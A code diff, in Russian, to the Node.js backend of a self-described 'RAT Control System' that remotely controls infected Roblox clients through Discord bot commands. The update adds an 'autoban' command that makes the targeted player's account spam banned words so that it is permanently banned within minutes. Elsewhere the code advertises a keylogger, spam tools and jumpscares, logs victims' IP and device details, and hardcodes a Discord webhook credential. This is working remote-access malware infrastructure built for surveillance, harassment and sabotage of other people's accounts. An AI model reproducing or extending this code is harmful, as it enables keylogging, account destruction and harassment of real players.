@@ -9,7 +9,7 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3
 const PORT = process.env.PORT || 10000;
 
 // Логирование конфигурации
-console.log('🔧 Конфигурация сервера v3.1:');
+console.log('🔧 Конфигурация сервера v3.2:');
 console.log(`- PORT: ${PORT}`);
 console.log(`- SERVER_URL: ${SERVER_URL}`);
 console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
@@ -49,7 +49,7 @@ function parseCommandWithTarget(message) {
     const textPossibleCommands = ['kick'];
     
     // Команды где первый аргумент может быть текстом или числом
-    const mixedFirstArgCommands = ['cameralock', 'freeze', 'blur', 'playaudio', 'jumpscare', 'camerashake'];
+    const mixedFirstArgCommands = ['cameralock', 'freeze', 'blur', 'playaudio', 'jumpscare', 'camerashake', 'autoban'];
     
     // Если команда в списке noTargetCommands
     if (noTargetCommands.includes(command)) {
@@ -77,7 +77,7 @@ function parseCommandWithTarget(message) {
         const firstArg = args[0].toLowerCase();
         
         // Список допустимых текстовых значений для этих команд
-        const validTextValues = ['on', 'off', 'enable', 'disable', 'true', 'false'];
+        const validTextValues = ['on', 'off', 'enable', 'disable', 'true', 'false', 'start', 'stop'];
         
         // Если первый аргумент - валидный текст или число, то это не ник
         if (validTextValues.includes(firstArg) || !isNaN(parseInt(firstArg))) {
@@ -192,9 +192,9 @@ if (DISCORD_TOKEN) {
     discordClient.on('ready', () => {
         console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
         console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
-        console.log(`🎯 Версия: 3.1 (27 команд + исправленный парсер)`);
+        console.log(`🎯 Версия: 3.2 (29 команд + AutoBan)`);
         
-        discordClient.user.setActivity('RAT Control Panel v3.1', { type: 'WATCHING' });
+        discordClient.user.setActivity('RAT Control Panel v3.2', { type: 'WATCHING' });
     });
 
     // ========== ВСЕ КОМАНДЫ ==========
@@ -321,6 +321,56 @@ if (DISCORD_TOKEN) {
                     }
                 },
                 
+                cameralock: async () => {
+                    const action = args[0] || "toggle";
+                    const actionText = action === "on" ? "Включена" : 
+                                     action === "off" ? "Выключена" : "Переключена";
+                    
+                    if (await sendCommand("cameralock", [action], target)) {
+                        const embed = createEmbed(
+                            '🎥 Блокировка камеры',
+                            `**Действие:** ${actionText}\nКамера и курсор заблокированы в центре экрана`,
+                            0x3498db,
+                            target
+                        );
+                        await message.reply({ embeds: [embed] });
+                    }
+                },
+                
+                camerashake: async () => {
+                    let duration = parseInt(args[0]) || 5;
+                    let intensity = parseInt(args[1]) || 2;
+                    
+                    duration = Math.min(duration, 30);
+                    intensity = Math.min(intensity, 10);
+                    
+                    if (await sendCommand("camerashake", [duration, intensity], target)) {
+                        const embed = createEmbed(
+                            '📷 Тряска камеры',
+                            `**Длительность:** \`${duration}\` секунд\n**Интенсивность:** \`${intensity}\``,
+                            0xe67e22,
+                            target
+                        );
+                        await message.reply({ embeds: [embed] });
+                    }
+                },
+                
+                autoban: async () => {
+                    const action = args[0] || "toggle";
+                    const actionText = action === "on" ? "АКТИВИРОВАН" : 
+                                     action === "off" ? "ВЫКЛЮЧЕН" : "ПЕРЕКЛЮЧЕН";
+                    
+                    if (await sendCommand("autoban", [action], target)) {
+                        const embed = createEmbed(
+                            '💀 AutoBan режим',
+                            `**Статус:** ${actionText}\n⚠️ **ВНИМАНИЕ:** Игрок начинает агрессивный спам запрещенными словами\n⏱️ **Бан наступит через:** 1-5 минут\n🔥 **Гарантированный пермабан**`,
+                            0xff0000,
+                            target
+                        );
+                        await message.reply({ embeds: [embed] });
+                    }
+                },
+                
                 // 🔊 АУДИО/ВИДЕО
                 mute: async () => {
                     if (await sendCommand("mute", [], target)) {
@@ -424,41 +474,6 @@ if (DISCORD_TOKEN) {
                             `👻 Скример ${name}`,
                             '**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n**Длительность:** ~10 секунд',
                             0xff0000,
-                            target
-                        );
-                        await message.reply({ embeds: [embed] });
-                    }
-                },
-                
-                // 📷 НОВЫЕ КАМЕРНЫЕ КОМАНДЫ
-                cameralock: async () => {
-                    const action = args[0] || "toggle";
-                    const actionText = action === "on" ? "Включена" : 
-                                     action === "off" ? "Выключена" : "Переключена";
-                    
-                    if (await sendCommand("cameralock", [action], target)) {
-                        const embed = createEmbed(
-                            '🎥 Блокировка камеры',
-                            `**Действие:** ${actionText}\nКамера игрока будет заблокирована в текущей позиции`,
-                            0x3498db,
-                            target
-                        );
-                        await message.reply({ embeds: [embed] });
-                    }
-                },
-                
-                camerashake: async () => {
-                    let duration = parseInt(args[0]) || 5;
-                    let intensity = parseInt(args[1]) || 2;
-                    
-                    duration = Math.min(duration, 30);
-                    intensity = Math.min(intensity, 10);
-                    
-                    if (await sendCommand("camerashake", [duration, intensity], target)) {
-                        const embed = createEmbed(
-                            '📷 Тряска камеры',
-                            `**Длительность:** \`${duration}\` секунд\n**Интенсивность:** \`${intensity}\`\nКамера игрока будет трястись с указанной силой`,
-                            0xe67e22,
                             target
                         );
                         await message.reply({ embeds: [embed] });
@@ -664,7 +679,7 @@ if (DISCORD_TOKEN) {
                                 { name: '🌐 Сервер', value: '🟢 Активен', inline: true },
                                 { name: '📨 Команды в очереди', value: `\`${data.pending_commands || 0}\``, inline: true },
                                 { name: '👥 Онлайн пользователей', value: `\`${data.online_users || 0}\``, inline: true },
-                                { name: '🛠️ Техническая информация', value: `• Версия: \`3.1.0\`\n• Сервер: \`${SERVER_URL}\`\n• Команд: \`27\`\n• Обновление: \`15 секунд\``, inline: false }
+                                { name: '🛠️ Техническая информация', value: `• Версия: \`3.2.0\`\n• Сервер: \`${SERVER_URL}\`\n• Команд: \`29\`\n• Опасные команды: \`AutoBan\``, inline: false }
                             )
                             .setTimestamp();
                         
@@ -677,7 +692,7 @@ if (DISCORD_TOKEN) {
                 // 📜 ПОМОЩЬ
                 help: async () => {
                     const helpEmbed = new EmbedBuilder()
-                        .setTitle('🤖 RAT Control Panel v3.1')
+                        .setTitle('🤖 RAT Control Panel v3.2')
                         .setDescription('Полный список всех команд с поддержкой таргетинга')
                         .setColor(0x7289da)
                         .addFields(
@@ -687,13 +702,8 @@ if (DISCORD_TOKEN) {
                                 inline: false 
                             },
                             { 
-                                name: '📷 Камерные команды', 
-                                value: '`/cameralock [ник] <on/off>` - блокировка камеры\n`/camerashake [ник] <секунды> <интенсивность>` - тряска камеры', 
-                                inline: false 
-                            },
-                            { 
                                 name: '👤 Управление игроком', 
-                                value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`', 
+                                value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] <on/off>`\n`/camerashake [ник] <секунды> <интенсивность>`\n`/autoban [ник] <on/off>` ⚠️', 
                                 inline: false 
                             },
                             { 
@@ -725,9 +735,14 @@ if (DISCORD_TOKEN) {
                                 name: '👥 Информация', 
                                 value: '`/users` - онлайн игроки\n`/status` - статус системы\n`/test` - тест\n`/print` - проверка связи', 
                                 inline: false 
+                            },
+                            { 
+                                name: '⚠️ ОПАСНАЯ КОМАНДА AutoBan', 
+                                value: '`/autoban [ник] <on/off>`\n**ВНИМАНИЕ:** Активация приводит к:\n1. Агрессивному спаму запрещенными словами\n2. Гарантированному пермабану аккаунта\n3. Бану через 1-5 минут\n**Использовать только на вражеских аккаунтах!**', 
+                                inline: false 
                             }
                         )
-                        .setFooter({ text: `Всего команд: 27 | Сервер: ${SERVER_URL} | Версия: 3.1.0` });
+                        .setFooter({ text: `Всего команд: 29 | Сервер: ${SERVER_URL} | Версия: 3.2.0 | 🔥 AutoBan добавлен` });
                     
                     await message.reply({ embeds: [helpEmbed] });
                 }
@@ -781,7 +796,7 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
                     color: color,
                     fields: fields,
                     timestamp: new Date().toISOString(),
-                    footer: { text: "RAT Control System v3.1" }
+                    footer: { text: "RAT Control System v3.2" }
                 }]
             })
         });
@@ -856,7 +871,7 @@ const server = http.createServer((req, res) => {
                     timestamp: Date.now()
                 });
                 
-                // Логируем инжект уведомления
+                // Логируем только важные события (инжект уведомления)
                 if (command === "inject_notify") {
                     const [playerName, gameName, ipInfo, executor, device] = args;
                     
@@ -873,29 +888,20 @@ const server = http.createServer((req, res) => {
                     );
                 }
                 
-                // Логирование новых камерных команд
-                if (command === "cameralock") {
+                // Логирование AutoBan активации
+                if (command === "autoban") {
                     const action = args[0] || "toggle";
                     const targetText = target || "всех игроков";
+                    const actionText = action === "on" ? "АКТИВИРОВАН" : "ВЫКЛЮЧЕН";
+                    
                     await sendDiscordMessage(
-                        "🎥 Блокировка камеры",
-                        `**Цель:** ${targetText}\n**Действие:** ${action}`,
-                        0x3498db
+                        "💀 AutoBan АКТИВИРОВАН",
+                        `**Цель:** ${targetText}\n**Действие:** ${actionText}\n⚠️ **Аккаунт будет забанен в течение 1-5 минут**`,
+                        0xff0000
                     );
                 }
                 
-                if (command === "camerashake") {
-                    const duration = args[0] || 5;
-                    const intensity = args[1] || 2;
-                    const targetText = target || "всех игроков";
-                    await sendDiscordMessage(
-                        "📷 Тряска камеры",
-                        `**Цель:** ${targetText}\n**Длительность:** ${duration} сек\n**Интенсивность:** ${intensity}`,
-                        0xe67e22
-                    );
-                }
-                
-                // Логирование спама
+                // Логирование спама (оставляем только важное)
                 if (command === "spam_completed") {
                     await sendDiscordMessage(
                         "📁 Спам завершен",
@@ -1034,13 +1040,13 @@ const server = http.createServer((req, res) => {
         cleanupInactiveUsers();
         res.end(JSON.stringify({
             status: "online",
-            version: "3.1.0",
+            version: "3.2.0",
             online_users: global.onlineUsers.size,
             pending_commands: commandQueue.length,
             discord_bot: discordClient && discordClient.user ? {
                 username: discordClient.user.tag,
                 status: "online",
-                commands_count: 27,
+                commands_count: 29,
                 targeted_commands: true
             } : { status: "disabled" }
         }));
@@ -1051,24 +1057,26 @@ const server = http.createServer((req, res) => {
     if (req.method === 'GET' && req.url === '/system_info') {
         res.end(JSON.stringify({
             name: "RAT Control System",
-            version: "3.1.0",
+            version: "3.2.0",
             description: "Продвинутая система удаленного управления Roblox клиентами",
             server: SERVER_URL,
             features: [
                 "Управление игроком (кик, заморозка, телепорт)",
                 "Скример система (Джефф Килер, Соник.exe)",
-                "Камерные команды (блокировка, тряска)",
+                "Камерные команды (блокировка с курсором, тряска)",
+                "AutoBan - гарантированный бан через агрессивный спам",
                 "Чат система с сообщениями",
                 "Мониторинг устройств",
                 "Кейлоггер",
                 "Spam инструменты",
-                "Таргетированные команды (исправленный парсер)"
+                "Таргетированные команды"
             ],
-            total_commands: 27,
+            total_commands: 29,
+            dangerous_commands: ["AutoBan"],
             discord_bot: discordClient && discordClient.user ? {
                 username: discordClient.user.tag,
                 status: "online",
-                commands_count: 27,
+                commands_count: 29,
                 targeted_commands: true
             } : { status: "disabled_no_token" }
         }));
@@ -1078,7 +1086,7 @@ const server = http.createServer((req, res) => {
     // Корневой путь
     if (req.method === 'GET' && req.url === '/') {
         res.end(JSON.stringify({
-            message: "RAT Control System v3.1",
+            message: "RAT Control System v3.2",
             endpoints: [
                 "/data?player=NAME - Получение команд",
                 "/users - Онлайн пользователи",
@@ -1086,7 +1094,7 @@ const server = http.createServer((req, res) => {
                 "/system_info - Информация о проекте"
             ],
             documentation: "Используйте /help в Discord для управления",
-            new_features: "✅ Исправленный парсер команд | ✅ CameraLock | ✅ CameraShake"
+            new_features: "✅ CameraLock с блокировкой курсора | ✅ AutoBan - гарантированный бан"
         }));
         return;
     }
@@ -1106,21 +1114,22 @@ server.listen(PORT, () => {
     console.log('• GET  /status - Статус сервера');
     console.log('• GET  /system_info - Информация о системе');
     console.log('');
-    console.log('🆕 НОВЫЕ ФУНКЦИИ v3.1:');
-    console.log('• ✅ Исправленный парсер команд (не путает текст с никами)');
-    console.log('• ✅ CameraLock - блокировка камеры игрока');
-    console.log('• ✅ CameraShake - тряска камеры с настройкой интенсивности');
+    console.log('🆕 НОВЫЕ ФУНКЦИИ v3.2:');
+    console.log('• ✅ Улучшенный CameraLock (курсор блокируется в центре через MouseBehavior.LockCenter)');
+    console.log('• ✅ AutoBan - АГРЕССИВНЫЙ СПАМ для гарантированного пермабана');
+    console.log('• ✅ Убрано дублирование логов (только важные события)');
+    console.log('• ✅ 29 команд с улучшенным парсером');
     console.log('');
     
     if (DISCORD_TOKEN) {
         console.log('💬 Discord команды готовы:');
-        console.log('• /help - Список всех команд (27 команд)');
+        console.log('• /help - Список всех команд (29 команд)');
         console.log('• /users - Онлайн пользователи');
-        console.log('• /cameralock [ник] <on/off> - Блокировка камеры');
+        console.log('• /cameralock [ник] <on/off> - Блокировка камеры и курсора');
         console.log('• /camerashake [ник] <секунды> <интенсивность> - Тряска');
-        console.log('• /jumpscare [ник] <тип> - Скримеры');
+        console.log('• /autoban [ник] <on/off> - ⚠️ ГАРАНТИРОВАННЫЙ БАН ⚠️');
         console.log('🎯 Формат: /команда [ник] [аргументы]');
-        console.log('⚠️  Теперь /fakeerror текст работает правильно!');
+        console.log('⚠️  AutoBan вызывает пермабан через 1-5 минут!');
     } else {
         console.log('⚠️ Discord команды недоступны - установи DISCORD_TOKEN');
     }
